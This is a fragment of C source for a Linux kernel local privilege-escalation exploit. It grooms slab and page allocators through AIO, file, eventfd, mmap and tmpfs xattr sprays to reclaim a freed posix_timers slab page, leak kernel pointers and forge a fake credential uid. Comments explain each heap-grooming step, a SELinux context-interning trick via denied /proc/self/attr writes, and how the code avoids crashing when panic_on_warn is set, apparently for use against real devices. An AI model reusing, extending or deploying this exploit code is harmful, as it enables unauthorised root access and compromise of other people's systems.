	ic_mc_build(&cs->base, slab, 0, base);
	lo = n > IC_MC_MARGIN ? n - IC_MC_MARGIN : 0;
	hi = n + IC_MC_MARGIN < total ? n + IC_MC_MARGIN : total - 1;
	for (k = lo; k <= hi; k++) {
		if (k == n)
			continue;
		if (ic_mc_lookup(k, &fd, &g))
			continue;
		if (ic_mc_write(k, base)) {
			fprintf(stderr, "[mcast] base write failed at %u/%u "
				"(step=%u idx=%u errno=%u)\n", k, total,
				g_mc_step, g_mc_idx, g_mc_errno);
			fflush(stderr);
			return -1;
		}
	}
	for (k = 0; k < 3; k++) {
		unsigned int probe = k == 0 ? lo : (k == 1 ? (lo + hi) / 2 : hi);
		unsigned int cnt;

		if (probe == n)
			continue;
		if (ic_mc_get(probe, img, &cnt) || cnt != IC_MC_NC ||
		    memcmp(img, base, sizeof(base))) {
			fprintf(stderr, "[mcast] base read-back failed at %u\n",
				probe);
			fflush(stderr);
			return -1;
		}
	}
	fprintf(stderr, "[mcast] base written over [%u,%u]\n", lo, hi);
	fflush(stderr);

	/* ---- stage 1: park the winner on it_lock ---- */
	ic_mc_build(&cs->s1, slab, 0, s1);
	if (ic_mc_write(n, s1)) {
		fprintf(stderr, "[mcast] s1 write failed (step=%u idx=%u "
			"errno=%u)\n", g_mc_step, g_mc_idx, g_mc_errno);
		fflush(stderr);
		return -1;
	}
	g_mc.active = 1;
	if (ic_mc_get(n, img, &count) || count != IC_MC_NC ||
	    memcmp(img, s1, sizeof(s1))) {
		fprintf(stderr, "[mcast] s1 read-back mismatch\n");
		fflush(stderr);
		return -1;
	}
	/* Hand the padding timers' sigqueue slots back before creating the
	 * trigger timers; see ic_release_pad_timers(). */
	ic_peak_release_pads();
	if (ic_peak_create_triggers()) {
		fprintf(stderr, "[peak] triggers failed\n");
		fflush(stderr);
		return -1;
	}
	ic_peak_fire_triggers();
	for (i = 0; i < 800; i++) {
		if (!ic_mc_get(n, img, &count) && count == IC_MC_NC) {
			v = ic_mc_word(img, (cs->l + 0x48) & 0xff, 8);
			if (ic_is_kernel_pointer(v)) {
				winner = v;
				break;
			}
		}
		nanosleep(&ts, NULL);
	}
	if (!winner) {
		fprintf(stderr, "[mcast] stage1 no winner\n");
		fflush(stderr);
		return -1;
	}
	fprintf(stderr, "[mcast] stage1 parked winner=0x%llx\n",
		(unsigned long long)winner);
	fflush(stderr);

	/* ---- stage 2: rewrite with the real head, release, erase ---- */
	ic_mc_build(&cs->s2, slab, winner, s2);
	g_mc.winner = winner;
	if (ic_mc_replace_parked(n, cs, s2)) {
		fprintf(stderr, "[mcast] parked rewrite failed (step=%u idx=%u "
			"errno=%u)\n", g_mc_step, g_mc_idx, g_mc_errno);
		fflush(stderr);
		return -1;
	}
	/* The release ends the stage-1 firing loop, and stage 1 left the base's
	 * nextevt at the huge scratch address, so the victim's tree stays quiet
	 * until something pokes its base.  settime(0) on the per-thread trigger
	 * timers runs trigger_base_recalc_expires() (nextevt = 0), so the next
	 * tick on the winner schedules handle_posix_cpu_timers() and the collect
	 * sees X as the base's stale leftmost with expires = 0.  A poke that
	 * lands while the winner is still in the stage-1 firing loop returns
	 * TIMER_RETRY without touching nextevt, so repeat it while polling. */
	ic_peak_fire_triggers();
	for (i = 0; i < 2000; i++) {
		v = 1;
		if (!ic_mc_get(n, img, &count) && count == IC_MC_NC)
			v = ic_mc_word(img, (cs->l + 0x20) & 0xff, 8);
		if (!v)
			break;
		if ((i % 100) == 99)
			ic_peak_fire_triggers();
		nanosleep(&ts, NULL);
	}
	if (v) {
		fprintf(stderr, "[mcast] stage2 collect did not run\n");
		fflush(stderr);
		return -1;
	}
	if (ic_mc_word(img, cs->l & 0xff, 8) != hit->value) {
		fprintf(stderr, "[mcast] stage2 did not clear the node\n");
		fflush(stderr);
		return -1;
	}
	if (ic_mc_word(img, (cs->l + 0x10) & 0xff, 8) !=
	    ic_mc_word(s2, (cs->l + 0x10) & 0xff, 8)) {
		fprintf(stderr, "[mcast] stage2 left q2 different\n");
		fflush(stderr);
		return -1;
	}
	fprintf(stderr, "[mcast] stage2 erased, cred=0x%llx fake_uid=0x%x "
		"img_sid=0x%x count=%u\n",
		(unsigned long long)cred, (unsigned int)(cred >> 32),
		(unsigned int)ic_mc_word(img, (cs->sec + 4) & 0xffU, 4),
		count);
	fflush(stderr);
	atomic_store_explicit(&g_peak_fake_uid, (unsigned int)(cred >> 32),
			      memory_order_relaxed);
	return 0;
}

static void ic_pagetype_stat(const char *tag);
static void ic_pcp_stat(const char *tag);
static void ic_slab_stat(const char *tag);
static void ic_slab_spray_stat(const char *tag);
static void ic_dump_file(const char *path, const char *tag);

/*
 * Leave every slab cache touched by the AIO spray with thousands of free
 * slots in partially-used slabs.  One io_setup() allocates one object in
 * each of kioctx (order-2), inode_cache (order-2), filp (order-1) and
 * vm_area_struct (order-0); those allocations come *before* the ring page
 * inside aio_setup_ring(), so a freshly discarded order-1 slab can be
 * swallowed whole by an order-2 slab page request and never split for our
 * order-0 ring pages.  Keeping every keep-th prewarmed context alive keeps
 * every slab non-empty, so SLUB retains it on the partial list; the
 * destroyed contexts hand their slots back and the real spray reuses
 * them without asking the buddy for a single slab page.
 */
struct ic_prewarm_job {
	ic_aio_context_t *ctxs;
	unsigned int first, last, keep;
};

static void *ic_prewarm_destroy_worker(void *arg)
{
	struct ic_prewarm_job *job = arg;
	unsigned int i;

	for (i = job->first; i < job->last; i++) {
		if (job->keep && !(i % job->keep))
			continue;
		(void)syscall(SYS_io_destroy, job->ctxs[i]);
	}
	return NULL;
}

static long long ic_now_ms(void)
{
	struct timespec ts;

	clock_gettime(CLOCK_MONOTONIC, &ts);
	return (long long)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
}

/* Root harness only: recover the physical frame behind a user page.  Used to
 * tell which zone the AIO ring pages actually came from (DMA32 below PFN
 * 0x100000 on the 4 GiB QEMU virt map). */
static unsigned long long ic_pagemap_pfn(const void *addr)
{
	unsigned long long e = 0;
	off_t off = (off_t)(((uintptr_t)addr >> 12) * 8);
	int fd = open("/proc/self/pagemap", O_RDONLY);

	if (fd < 0)
		return 0;
	if (pread(fd, &e, sizeof(e), off) != (ssize_t)sizeof(e))
		e = 0;
	close(fd);
	if (!(e & (1ULL << 63)))
		return 0;
	return e & ((1ULL << 55) - 1);
}

static int ic_prewarm_spray_caches(unsigned int total, unsigned int keep)
{
	ic_aio_context_t *ctxs;
	struct timespec settle = { .tv_sec = 3 };
	unsigned int made = 0, nthreads = 8, t, slice, off;
	struct ic_prewarm_job jobs[32];
	pthread_t tids[32];
	long long t0, t1, t2;

	if (!total || keep < 2)
		return -1;
	ctxs = calloc(total, sizeof(*ctxs));
	if (!ctxs)
		return -1;
	t0 = ic_now_ms();
	for (made = 0; made < total; made++) {
		if (syscall(SYS_io_setup, 1, &ctxs[made]))
			break;
	}
	t1 = ic_now_ms();
	/* io_destroy() waits for that context's percpu_ref completion, so a
	 * serial loop costs one RCU grace period per context.  Overlap them:
	 * the callbacks batch into a handful of grace periods. */
	if (!nthreads)
		nthreads = 1;
	slice = (made + nthreads - 1) / nthreads;
	for (t = 0, off = 0; t < nthreads && off < made; t++) {
		jobs[t].ctxs = ctxs;
		jobs[t].first = off;
		off += slice;
		jobs[t].last = off < made ? off : made;
		jobs[t].keep = keep;
		if (pthread_create(&tids[t], NULL, ic_prewarm_destroy_worker,
				   &jobs[t]) != 0) {
			ic_prewarm_destroy_worker(&jobs[t]);
			tids[t] = 0;
		}
	}
	for (t = 0; t < nthreads; t++)
		if (tids[t])
			(void)pthread_join(tids[t], NULL);
	t2 = ic_now_ms();
	free(ctxs);
	fprintf(stderr,
		"[peak] prewarm made=%u kept=%u setup=%lldms free=%lldms\n",
		made, made / keep, t1 - t0, t2 - t1);
	/* The destroyed contexts free their ring pages and slab objects from
	 * RCU/workqueue context; let that drain before the victim/oracle
	 * timing starts. */
	nanosleep(&settle, NULL);
	return made ? 0 : -1;
}

/*
 * Pre-fill the per-mapping slab caches (vm_area_struct is order 0,
 * maple_node is order 1) and then keep every keep-th mapping alive so each
 * slab stays partial instead of being discarded.  16384 io_setup() calls
 * would otherwise each need a struct vm_area_struct and let the cache ask
 * the buddy for a slab page every 20 VMAs; every such page is one more
 * consumer that can split the freed posix_timers block between itself and a
 * ring page.  The kept mappings leak on purpose (the attempt process is
 * short-lived).
 */
static void ic_vma_prewarm(unsigned int total, unsigned int keep)
{
	unsigned char **map;
	unsigned int i, made = 0, kept = 0;

	if (!total || keep < 2)
		return;
	map = calloc(total, sizeof(*map));
	if (!map)
		return;
	for (i = 0; i < total; i++) {
		/* Adjacent identical mappings are merged by do_mmap(), which
		 * collapsed 16384 PROT_NONE maps into ~113 slabs' worth of
		 * vm_area_struct objects and made the prewarm useless.  Alternate
		 * the protection so no two neighbours can merge; every slab of 20
		 * objects then has at least one kept object, so no slab is ever
		 * discarded and the prewarm frees no order-0 page at all (a freed
		 * slab page would land on the same Unmovable pcp list the ring
		 * pages later refill from and postpone the posix_timers split). */
		void *p = mmap(NULL, 2 * IC_PAGE,
			       (i & 1) ? PROT_READ : PROT_NONE,
			       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

		if (p == MAP_FAILED)
			break;
		map[i] = p;
	}
	made = i;
	for (i = 0; i < made; i++) {
		if (!(i % keep)) {
			kept++;
			continue;
		}
		(void)munmap(map[i], 2 * IC_PAGE);
	}
	fprintf(stderr, "[peak] vma prewarm made=%u kept=%u\n", made, kept);
	free(map);
}

/* filp-cache shield for the order-0 AIO spray.
 *
 * Every io_setup() allocates one struct file before aio_setup_ring() ever
 * asks for its order-0 ring page.  The filp cache uses order-1 slabs, so
 * each new filp slab takes an order-1 block out of the unmovable buddy
 * list/free area -- the same list the discarded posix_timers slab was just
 * returned to, at the head (LIFO).  With the filp cache full, the first new
 * filp slab therefore steals X's block and turns it into kernel-only slab
 * memory before any user-mappable ring page can split it, which is why the
 * AIO reclaim never leaked.
 *
 * Open N files, then close all but one object per 25-object slab: the freed
 * objects stay in partial slabs (never discarded, because each slab keeps a
 * live file) and the spray's filp allocations pop those free slots instead
 * of allocating new order-1 slab pages.  Everything else in the io_setup
 * path is order 2 (kioctx, inode_cache) or order 0, so the ring pages get
 * the freed order-1 blocks.
 */
#define IC_FILP_SHIELD_MAX 32768
#define IC_FILP_SHIELD_SLAB_OBJS 25
static int ic_filp_shield_fds[IC_FILP_SHIELD_MAX];

static int ic_filp_shield(unsigned int count)
{
	static const char *const paths[] = { "/dev/null", "/", "/proc/self/exe" };
	unsigned int made = 0, kept = 0, i;
	const char *path = NULL;
	struct rlimit rl;
	int probe;

	if (!count || count > IC_FILP_SHIELD_MAX)
		return -1;
	if (!getrlimit(RLIMIT_NOFILE, &rl)) {
		struct rlimit want;

		want.rlim_max = rl.rlim_max;
		want.rlim_cur = (rlim_t)count + 4096;
		if (rl.rlim_max != RLIM_INFINITY && want.rlim_cur > rl.rlim_max)
			want.rlim_cur = rl.rlim_max;
		if (want.rlim_cur > rl.rlim_cur)
			(void)setrlimit(RLIMIT_NOFILE, &want);
	}
	for (i = 0; i < sizeof(paths) / sizeof(paths[0]); i++) {
		probe = open(paths[i], O_RDONLY |
			     (!strcmp(paths[i], "/") ? O_DIRECTORY : 0));
		if (probe >= 0) {
			close(probe);
			path = paths[i];
			break;
		}
	}
	if (!path) {
		fprintf(stderr, "[peak] filp shield: no open path\n");
		return -1;
	}
	for (i = 0; i < count; i++) {
		int fd = open(path, O_RDONLY |
			      (!strcmp(path, "/") ? O_DIRECTORY : 0));

		if (fd < 0)
			break;
		ic_filp_shield_fds[made++] = fd;
	}
	for (i = 0; i < made; i++) {
		if (!(i % IC_FILP_SHIELD_SLAB_OBJS)) {
			ic_filp_shield_fds[kept++] = ic_filp_shield_fds[i];
			continue;
		}
		close(ic_filp_shield_fds[i]);
	}
	fprintf(stderr, "[peak] filp shield path=%s opened=%u kept=%u slots=%u\n",
		path, made, kept, made - kept);
	fflush(stderr);
	return made ? 0 : -1;
}

/* kmalloc-64 shield for the same reclaim.
 *
 * aio_private_file() allocates the anon inode's LSM blob
 * (sizeof(struct inode_security_struct) == 0x28) before aio_setup_ring()
 * asks for its order-0 ring page.  The kmalloc-64 cache is full at the
 * spray, so that kzalloc() is the *first* order-0 request of the whole
 * spray: it takes the head of the Unmovable order-1 free list -- the block
 * the flushers just discarded, with X inside -- and turns that page into
 * kernel-only slab memory before any ring page can split the block.  The
 * ring page then takes the other half of the block, so the reclaim only
 * succeeds when X happens to sit in the second half.
 *
 * eventfd() allocates one 0x30-byte eventfd_ctx from kmalloc-64 (plus one
 * anon inode from the order-2 inode_cache and one filp from the shielded
 * filp cache).  Open N, close all but one per 64: the survivors keep every
 * slab populated, so the freed slots stay on the partial lists and the
 * spray's LSM blobs reuse them instead of asking the buddy for a page.
 */
#define IC_KM64_SHIELD_MAX 16384
#define IC_KM64_SHIELD_SLAB_OBJS 64
static int ic_km64_shield_fds[IC_KM64_SHIELD_MAX];

static int ic_km64_shield(unsigned int count)
{
	unsigned int made = 0, kept = 0, i;
	struct rlimit rl;

	if (!count || count > IC_KM64_SHIELD_MAX)
		return -1;
	if (!getrlimit(RLIMIT_NOFILE, &rl)) {
		struct rlimit want;

		want.rlim_max = rl.rlim_max;
		want.rlim_cur = (rlim_t)count + 4096;
		if (rl.rlim_max != RLIM_INFINITY && want.rlim_cur > rl.rlim_max)
			want.rlim_cur = rl.rlim_max;
		if (want.rlim_cur > rl.rlim_cur)
			(void)setrlimit(RLIMIT_NOFILE, &want);
	}
	for (i = 0; i < count; i++) {
		/* EFD_CLOEXEC == O_CLOEXEC: the exec'd helper must not keep
		 * the shield alive. */
		int fd = (int)syscall(SYS_eventfd2, 0U, 0x80000U);

		if (fd < 0)
			break;
		ic_km64_shield_fds[made++] = fd;
	}
	for (i = 0; i < made; i++) {
		if (!(i % IC_KM64_SHIELD_SLAB_OBJS)) {
			ic_km64_shield_fds[kept++] = ic_km64_shield_fds[i];
			continue;
		}
		close(ic_km64_shield_fds[i]);
	}
	fprintf(stderr, "[peak] km64 shield opened=%u kept=%u slots=%u\n",
		made, kept, made - kept);
	fflush(stderr);
	return made ? 0 : -1;
}

/* Harness-only: enforce the SLUB partial-list policy the reclaim depends on.
 * min_partial is the per-node empty-slab reserve; cpu_partial is the frozen
 * per-CPU partial list.  With both at zero every slab that reaches zero
 * in-use objects is discarded to the buddy immediately. */
static void ic_slab_tune(void)
{
	static const char *const attrs[] = { "min_partial", "cpu_partial" };
	static const char *const envs[] = { "IC_SLAB_MINPARTIAL",
					    "IC_SLAB_CPUPARTIAL" };
	unsigned int i;

	for (i = 0; i < 2; i++) {
		const char *val = getenv(envs[i]);
		char path[128];
		int fd;

		if (!val || geteuid() != 0)
			continue;
		snprintf(path, sizeof(path),
			 "/sys/kernel/slab/posix_timers_cache/%s", attrs[i]);
		fd = open(path, O_WRONLY);
		if (fd < 0) {
			fprintf(stderr, "[peak] tune %s: open failed\n", attrs[i]);
			continue;
		}
		if (write(fd, val, strlen(val)) != (ssize_t)strlen(val))
			fprintf(stderr, "[peak] tune %s=%s failed\n", attrs[i],
				val);
		else
			fprintf(stderr, "[peak] tune %s=%s\n", attrs[i], val);
		close(fd);
	}
}

/* ---------------- IC_XCAP: order-1 slab capture probe ---------------------
 *
 * The io_uring reclaim works because its two order-1 ring pages come from the
 * same per-CPU UNMOVABLE order-1 list that X's discarded posix_timers_cache
 * slab lands on.  Any other order-1 UNMOVABLE allocation issued on cpu0 at
 * that moment should pop the same list.
 *
 * kmalloc-256 is the one order-1 slab cache whose contents a shell process
 * can read back: tmpfs stores user.* attributes as
 *     struct simple_xattr { list_head list; char *name; size_t size;
 *                           char value[]; }
 * so a 224-byte value makes the object exactly 256 bytes and a full slab is
 * 32 objects in one order-1 block.  getxattr(2) reads the value back, which
 * turns B's RB_CLEAR_NODE() self-write into a kernel pointer inside one of
 * our values.
 *
 * Values are all zero.  Erase then sees {parent_color=0, rb_right=0,
 * rb_left=0}: the node is red with a NULL parent, so the erase takes the
 * leaf path, sets the real tree root to NULL and performs RB_CLEAR_NODE()
 * without any wild write.  The rb_left=target pattern used on mapped ring
 * pages cannot be used here: each object is a separate 224-byte window, so
 * one template can only encode a single candidate offset at a time.  With
 * zeros every offset works; the candidates whose node lands in the 32-byte
 * object header (or crosses an object boundary) are the only unsafe ones.
 */
#define IC_XCAP_VALUE 224U
#define IC_XCAP_NAME 48
#define IC_XCAP_PREWARM 4096U
#define IC_XCAP_SPRAY 512U

static struct {
	int ready;
	unsigned int next;
	unsigned int count;
	char path[160];
	unsigned char value[IC_XCAP_VALUE];
} ic_xcap;

static unsigned int ic_xcap_alloc(unsigned int n)
{
	char name[IC_XCAP_NAME];
	unsigned int i;

	for (i = 0; i < n; i++) {
		snprintf(name, sizeof(name), "user.xc%u", ic_xcap.next);
		if (setxattr(ic_xcap.path, name, ic_xcap.value,
			     sizeof(ic_xcap.value), 0))
			break;
		ic_xcap.next++;
	}
	ic_xcap.count = ic_xcap.next;
	return i;
}

static int ic_xcap_prepare(void)
{
	const char *dir = getenv("IC_XCAP_DIR");
	const char *s;
	unsigned int pre = IC_XCAP_PREWARM;
	unsigned int made;

	s = getenv("IC_XCAP_PRE");
	if (s)
		pre = (unsigned int)strtoul(s, NULL, 0);
	if (!dir)
		dir = "/tmp/xc";
	if (mkdir(dir, 0777) && errno != EEXIST) {
		fprintf(stderr, "[xcap] mkdir %s errno=%d\n", dir, errno);
		return -1;
	}
	if (mount("tmpfs", dir, "tmpfs", 0, "size=64M,mode=0777") &&
	    errno != EBUSY) {
		fprintf(stderr, "[xcap] mount %s errno=%d\n", dir, errno);
		return -1;
	}
	snprintf(ic_xcap.path, sizeof(ic_xcap.path), "%s/x", dir);
	if (open(ic_xcap.path, O_RDWR | O_CREAT, 0600) < 0) {
		fprintf(stderr, "[xcap] create %s errno=%d\n", ic_xcap.path,
			errno);
		return -1;
	}
	memset(ic_xcap.value, 0, sizeof(ic_xcap.value));
	made = ic_xcap_alloc(pre);
	ic_xcap.ready = made > 0;
	fprintf(stderr, "[xcap] prewarm=%u/%u value=%u\n", made, pre,
		(unsigned int)sizeof(ic_xcap.value));
	return made == pre ? 0 : -1;
}

static void ic_xcap_spray(void)
{
	const char *s = getenv("IC_XCAP");
	unsigned int n = IC_XCAP_SPRAY;
	unsigned int start;
	unsigned int made;

	if (!ic_xcap.ready)
		return;
	if (s)
		n = (unsigned int)strtoul(s, NULL, 0);
	start = ic_xcap.count;
	made = ic_xcap_alloc(n);
	fprintf(stderr, "[xcap] spray n=%u made=%u total=%u\n", n, made,
		start + made);
}

static unsigned int ic_xcap_scan(const char *tag)
{
	unsigned char val[IC_XCAP_VALUE];
	char name[IC_XCAP_NAME];
	unsigned int i, hits = 0;

	for (i = 0; i < ic_xcap.count; i++) {
		ssize_t r;
		unsigned int o;

		snprintf(name, sizeof(name), "user.xc%u", i);
		r = getxattr(ic_xcap.path, name, val, sizeof(val));
		if (r <= 0)
			continue;
		for (o = 0; o + 8 <= (unsigned int)r; o += 8) {
			uint64_t v;

			memcpy(&v, val + o, sizeof(v));
			if (!ic_is_kernel_pointer(v))
				continue;
			if (!hits)
				fprintf(stderr,
					"[xcap] HIT@%s name=%u off=%u v=0x%llx\n",
					tag, i, o,
					(unsigned long long)v);
			hits++;
		}
	}
	fprintf(stderr, "[xcap] scan@%s names=%u hits=%u\n", tag,
		ic_xcap.count, hits);
	return hits;
}

/* Interning a process context is not something shell is allowed to do:
 * selinuxfs check_context is denied and only init may load the policy.
 * But selinux_setprocattr() calls security_context_to_sid() on the string
 * *before* it checks PROCESS__SETEXEC / SETFCREATE, and a denied write
 * does not roll the new sidtab entry back.  So a denied
 * /proc/self/attr/exec write still interns the context, at the cost of
 * one audited denial.  That is what lets the sid scan reach a context no
 * process uses yet on the device; the QEMU harness interns at boot
 * (ic_intern=) instead, because init may.  Must run before any timer
 * fake cred exists, i.e. at the very start of the attempt. */
static void ic_peak_intern_ctx(const char *ctx)
{
	static const char *const names[] = { "exec", "fscreate" };
	char path[64];
	size_t len;
	unsigned int i;

	if (!ctx || !*ctx)
		return;
	len = strlen(ctx);
	for (i = 0; i < sizeof(names) / sizeof(names[0]); i++) {
		long fd, w;

		snprintf(path, sizeof(path), "/proc/self/attr/%s",
			 names[i]);
		fd = syscall(SYS_openat, AT_FDCWD, path,
			     O_WRONLY | O_CLOEXEC, 0L);
		if (fd < 0) {
			ic_logf("[intern] %s open errno=%d\n", names[i],
				errno);
			continue;
		}
		w = syscall(SYS_write, fd, ctx, len);
		ic_logf("[intern] %s write=%ld errno=%d ctx=%s\n",
			names[i], w, w < 0 ? errno : 0, ctx);
		(void)syscall(SYS_close, fd);
		/* The sidtab entry (if the string is a valid context)
		 * exists now whether the write was allowed or not. */
		break;
	}
}

static int g_retry_fd = -1;
/* Set once the candidate timers are deleted: from then on worker 0's base
 * keeps the stale node and release_task() walks it at exit. */
static int g_peak_doomed;

/* /proc/sys/kernel/panic_on_warn: 1 => a WARN reboots, 0 => harmless.
 * -1 (unreadable or absent) is treated as fatal by the caller. */
static int ic_panic_on_warn(void)
{
	char buf[32];
	ssize_t n;
	int fd = open("/proc/sys/kernel/panic_on_warn", O_RDONLY | O_CLOEXEC);

	if (fd < 0)
		return -1;
	n = read(fd, buf, sizeof(buf) - 1);
	close(fd);
	if (n <= 0)
		return -1;
	buf[n] = '\0';
	return strtoul(buf, NULL, 0) ? 1 : 0;
}

/*
 * IC_SLABTRACE: /proc/slabinfo is readable from the unprivileged shell, so
 * the attempt can timestamp the posix_timers_cache counters at every reclaim
 * step and see exactly when a slab leaves the cache (num_objs drops).
 *
 * The fd is opened and read once early, before the padding geometry exists:
 * opening a proc file allocates a file, a dentry and the seq_file buffer, and
 * an order-0 allocation at the wrong moment can split the very order-1 block
 * this chain depends on.  Every later sample is just lseek(0) + read(2) on
 * that fd, which allocates nothing.
 */
static int g_sladtrace = -1;
/* IC_SLABTRACE drives the formatted trace and the adaptive settle/drop
 * waits; IC_PAD_ALIGN only needs the raw num_objs reads. */
static int g_slabtrace_on;

static void ic_sladb_open(void)
{
	char tmp[4096];

	if (g_sladtrace >= 0)
		return;
	if (getenv("IC_SLABTRACE"))
		g_slabtrace_on = 1;
	if (!g_slabtrace_on && !getenv("IC_PAD_ALIGN"))
		return;
	g_sladtrace = open("/proc/slabinfo", O_RDONLY);
	if (g_sladtrace >= 0)
		(void)!read(g_sladtrace, tmp, sizeof tmp);
}

/* One lseek(0)+read(2) on the pre-opened fd; no allocation of its own. */
static int ic_sladb_line(char *out, size_t outsz)
{
	static char buf[8192];
	ssize_t n;
	int off = 0;

	if (g_sladtrace < 0)
		return -1;
	if (lseek(g_sladtrace, 0, SEEK_SET) < 0)
		return -1;
	while (off < 262144) {
		char *p, *nl;

		n = read(g_sladtrace, buf, sizeof buf - 1);
		if (n <= 0)
			return -1;
		buf[n] = 0;
		p = strstr(buf, "posix_timers_cache");
		if (p) {
			nl = strchr(p, '\n');
			if (nl)
				*nl = 0;
			snprintf(out, outsz, "%s", p);
			return 0;
		}
		off += (int)n;
	}
	return -1;
}

/* num_objs for posix_timers_cache, or -1 when tracing is off. */
static long ic_sladb_count(void)
{
	char line[256];
	unsigned long active, total;

	if (ic_sladb_line(line, sizeof line))
		return -1;
	if (sscanf(line, "%*s %lu %lu", &active, &total) != 2)
		return -1;
	return (long)total;
}

/* active and total together: a kfree that stays inside a live slab moves
 * active only, so settling on num_objs alone misses those stragglers and
 * they then masquerade as X's discard in the next window. */
static int ic_sladb_pair(long *active, long *total)
{
	char line[256];
	long a, t;

	if (ic_sladb_line(line, sizeof line))
		return -1;
	if (sscanf(line, "%*s %ld %ld", &a, &t) != 2)
		return -1;
	*active = a;
	*total = t;
	return 0;
}

/*
 * Runtime alignment of the padding block (IC_PAD_ALIGN).
 *
 * The reclaim geometry only works when the padding starts on a slab
 * boundary.  posix_timers_cache holds 31 objects per order-1 slab, so
 * IC_SLAB_PADDING_TIMERS pads cover 135 full slabs and leave exactly
 * IC_SLAB_PADDING_TIMERS % 31 objects in the last one; A's and B's
 * timers take two more slots of that slab, their call_rcu() frees hand
 * both slots back, and the 16 candidates then fill the slab exactly.
 * X lives in that slab, so freeing pad_skip pads plus flush_del flushers
 * empties it - which is what the fixed 15/16 knobs assume.
 *
 * Without the alignment the pad block starts somewhere in the slab the
 * cache's active slab happened to be, every attempt lands on a different
 * offset (the device's per-CPU state is otherwise static, so the same
 * wrong one on every run), X's slab keeps pads or alien timers the
 * deletes never free, and the flush delete discards nothing.
 *
 * num_objs (num_objs in /proc/slabinfo) only moves when SLUB had to
 * allocate a slab, i.e. the CPU had neither a cpu-partial nor a node
 * partial slab left.  That allocation starts an empty slab and the
 * create which triggered it is the slab's first object.  Walk to such a
 * jump, fill the slab with 30 more, verify num_objs stayed put and that
 * the next create starts another fresh slab (a foreign jump from another
 * CPU fails both checks), then fill that one too: the pad loop now
 * begins a third, empty slab and every pad block is boundary-aligned.
 * The probe timers stay allocated on purpose - freeing them would hand
 * the slots back and undo the alignment.
 */
#define IC_ALIGN_IDS_MAX 2048
static int g_align_ids[IC_ALIGN_IDS_MAX];
static unsigned int g_align_n;

static int ic_align_create(void)
{
	struct sigevent ev;
	int id = -1;

	memset(&ev, 0, sizeof(ev));
	ev.sigev_notify = SIGEV_NONE;
	if (syscall(SYS_timer_create, CLOCK_MONOTONIC, &ev, &id))
		return -1;
	if (g_align_n < IC_ALIGN_IDS_MAX)
		g_align_ids[g_align_n++] = id;
	return 0;
}

static int ic_align_fill(unsigned int n)
{
	while (n--)
		if (ic_align_create())
			return -1;
	return 0;
}

static int ic_align_pad_block(void)
{
	long a, t, base;
	unsigned int round, i;

	for (round = 0; round < 32; round++) {
		int found = 0;

		if (ic_sladb_pair(&a, &base))
			return -1;
		for (i = 0; i < 400 && !found; i++) {
			if (ic_align_create())
				return -1;
			if (ic_sladb_pair(&a, &t))
				return -1;
			if (t > base)
				found = 1;
		}
		if (!found)
			continue;
		if (ic_align_fill(30))
			return -1;
		if (ic_sladb_pair(&a, &t) || t != base + 31)
			continue;
		if (ic_align_create())
			return -1;
		if (ic_sladb_pair(&a, &t) || t != base + 62)
			continue;
		if (ic_align_fill(30))
			return -1;
		if (ic_sladb_pair(&a, &t) || t != base + 62)
			continue;
		fprintf(stderr,
			"[peak] pad aligned total=%ld probes=%u\n",
			t, g_align_n);
		return 0;
	}
	fprintf(stderr, "[peak] pad align failed probes=%u\n", g_align_n);
	return -1;
}

static void ic_sladb(const char *tag)
{
	char line[256];
	struct timespec ts;

	if (!g_slabtrace_on)
		return;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	if (ic_sladb_line(line, sizeof line)) {
		fprintf(stderr, "[slab] %-13s t=%lld.%03ld <not found>\n", tag,
			(long long)ts.tv_sec,
			(long)(ts.tv_nsec / 1000000));
		return;
	}
	fprintf(stderr, "[slab] %-13s t=%lld.%03ld %s\n", tag,
		(long long)ts.tv_sec, (long)(ts.tv_nsec / 1000000), line);
}

/* Wait until num_objs stops moving for quiet_ms (the RCU frees of the pad
 * delete trickle in over several seconds on the device, so a fixed sleep
 * leaves stragglers that look like X's discard later on). */
static long ic_sladb_wait_stable(unsigned int quiet_ms, unsigned int max_ms)
{
	struct timespec ts = { .tv_nsec = 20000000 };
	long la = -2, lt = -2;
	unsigned int quiet = 0, waited = 0;

	while (waited < max_ms) {
		long a, t;

		if (ic_sladb_pair(&a, &t)) {
			nanosleep(&ts, NULL);
			waited += 20;
			continue;
		}
		if (a == la && t == lt)
			quiet += 20;
		else {
			quiet = 0;
			la = a;
			lt = t;
		}
		if (quiet >= quiet_ms) {
			fprintf(stderr, "[peak] settled active=%ld total=%ld\n",
				la, lt);
			return lt;
		}
		nanosleep(&ts, NULL);
		waited += 20;
	}
	fprintf(stderr, "[peak] settle timeout active=%ld total=%ld\n", la, lt);
	return lt;
}

/* Make the phase log survive a kernel panic.  f2fs keeps the tail of a
 * freshly written file in page cache until a checkpoint, and panic() never
 * gets there: run13's log was cut to 2 KB exactly at the point where the
 * allocator work began.  fsync() on a pipe or tty fails with EINVAL, which
 * is harmless, so this can be called unconditionally. */
static void ic_log_sync(void)
{
	fflush(stderr);
	(void)!fsync(STDERR_FILENO);
}

/* Poll until num_objs has dropped by at least one 31-object slab, i.e. the
 * flush delete emptied X's slab and discard_slab() returned its page to the
 * page allocator.  Returns the delay in ms, or -1 on timeout. */
static long ic_sladb_wait_drop(long base, unsigned int timeout_ms)
{
	struct timespec ts = { .tv_nsec = 1000000 };
	struct timespec t0, t1;
	unsigned int waited = 0;

	if (base <= 0)
		return -1;
	clock_gettime(CLOCK_MONOTONIC, &t0);
	while (waited < timeout_ms) {
		long now = ic_sladb_count();

		if (now > 0 && now <= base - 31) {
			clock_gettime(CLOCK_MONOTONIC, &t1);
			return (t1.tv_sec - t0.tv_sec) * 1000L +
			       (t1.tv_nsec - t0.tv_nsec) / 1000000L;
		}
		nanosleep(&ts, NULL);
		waited++;
	}
	return -1;
}

/* Must this attempt park instead of returning?  A leaked node always must:
 * its page is one of our psl objects and closing the sockets at exit would
 * free it under the walk.  A plain miss only has to when the exit WARN
 * would be fatal; IC_PARK_TEST forces the park path for validation. */
static int ic_peak_should_park(void)
{
	if (g_mc.leak)
		return 1;
	if (getenv("IC_PARK_TEST"))
		return 1;
	if (!g_peak_doomed)
		return 0;
	return ic_panic_on_warn() != 0;
}

/*
 * Park an attempt whose psl is already carrying X.
 *
 * B has been reaped, so X's node is out of the tree while release_task()
 * still reaches it through the dying thread.  Returning from the attempt
 * would exit the child and walk that node: timerqueue_del() warns (or
 * erases through a pattern we wrote into the psl), and panic_on_warn=1
